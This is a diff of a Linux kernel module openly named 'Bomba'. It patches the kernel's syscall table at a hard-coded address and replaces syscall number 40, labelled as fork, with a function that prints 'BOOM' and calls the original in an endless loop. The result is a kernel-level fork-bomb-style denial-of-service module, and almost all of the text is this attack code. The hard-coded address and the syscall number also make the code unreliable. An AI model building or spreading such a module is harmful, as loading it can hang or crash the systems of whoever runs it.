@@ -16,40 +16,30 @@
 MODULE_LICENSE("GPL");
 #include "syscall.h"
 
-//char* arg;
-//module_param(arg, charp, 0);
+#define fork_code 40
 
-int (*orig_syscall)(const char *path); /*the original systemcall*/ 
+int (*orig_syscall)(void); /*the original systemcall*/ 
 const unsigned long** sys_call_table = (const unsigned long**)0xffffffff81801460;
 
-//concatenate two strings together
-//user is responsible for kfreeing returned memory
-char* concat(char* left, char* right) {
-	int leftlen = strlen(left);
-	int rightlen = strlen(right);
-	char* full = kmalloc(leftlen+rightlen+1, GFP_KERNEL);
-	strcpy(full, left);
-	strcpy(full+leftlen, right);
-	return full;
-}
-
 // This kills the crab.
-int replace_syscall(char* path) {
-	printk("Bomba go");
-	while(0)
-		orig_syscall(path);	
-	printk("END REPLACEMENT CALL");
+int replace_syscall(void) {
+	printk("BOOM\n");
+	while(1)
+		orig_syscall();	
+	printk("END REPLACEMENT CALL\n");
 	return 0;
 }
 
 int init_module() {
+	printk("Bomba initializing...\n");
 	make_rw(sys_call_table);
-	orig_syscall = sys_call_table[SYS_fork];
-	sys_call_table[SYS_fork] = replace_syscall;
+	orig_syscall = sys_call_table[fork_code];
+	sys_call_table[fork_code] = replace_syscall;
+	printk("Bomba ready to blow...\n");
 	return 0;
 }
 
 void cleanup_module() {
-	sys_call_table[SYS_fork] = orig_syscall;
-	printk(KERN_INFO "Module Removed\n");
+	sys_call_table[fork_code] = orig_syscall;
+	printk(KERN_INFO "Bomba defused\n");
 }
